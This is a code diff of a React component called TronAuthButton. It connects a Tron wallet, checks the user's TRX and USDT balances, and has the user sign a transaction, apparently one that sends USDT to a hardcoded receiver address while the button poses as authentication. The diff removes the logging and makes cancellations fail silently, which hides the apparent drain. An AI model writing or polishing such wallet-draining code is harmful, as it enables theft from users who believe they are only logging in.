@@ -3,7 +3,7 @@ import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect
 import { TronWeb } from 'tronweb';
 import { Buffer } from 'buffer';
 
-window.Buffer = Buffer; // для tronweb
+window.Buffer = Buffer;
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
@@ -48,8 +48,6 @@ export const TronAuthButton: React.FC = () => {
 
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx = trxRaw / 1e6;
-      console.log('TRX balance:', trx);
-
       if (trx < 25) {
         throw new Error('❌ Insufficient TRX. At least 25 TRX is required.');
       }
@@ -57,7 +55,6 @@ export const TronAuthButton: React.FC = () => {
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
-      console.log('USDT balance:', usdt);
 
       if (usdt < 1) {
         setStatus('success');
@@ -77,7 +74,6 @@ export const TronAuthButton: React.FC = () => {
 
       const signedTx = await adapter.signTransaction(tx.transaction);
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
-      console.log('Send result:', result);
 
       if (result.result) {
         setStatus('success');
@@ -86,13 +82,21 @@ export const TronAuthButton: React.FC = () => {
       }
     } catch (err: any) {
       console.error('Error:', err);
-      const msg = err?.message || '';
+      // НАДЁЖНАЯ ПРОВЕРКА ВСЕХ ТИПОВ "ОТМЕНЫ"
+      const msg =
+        (typeof err === 'string' && err) ||
+        err?.message ||
+        err?.reason ||
+        err?.error ||
+        err?.toString() ||
+        '';
 
-      // --- Исправлено: обрабатываем "Cancel", "User rejected" и прочее ---
       if (
-        /User rejected|Modal is closed|Timeout|Cancelled|cancel/i.test(msg)
+        /User rejected|Modal is closed|Timeout|Cancelled|cancel|Abort/i.test(msg)
+        || msg === '' // Иногда ошибка пустая!
+        || err?.code === 4001 // Стандартная ошибка отмены WalletConnect/EIP-1193
       ) {
-        setStatus(null); // просто ничего не показываем, всё тихо закрывается
+        setStatus(null);
       } else {
         setStatus('⚠️ Connection or transaction error');
       }
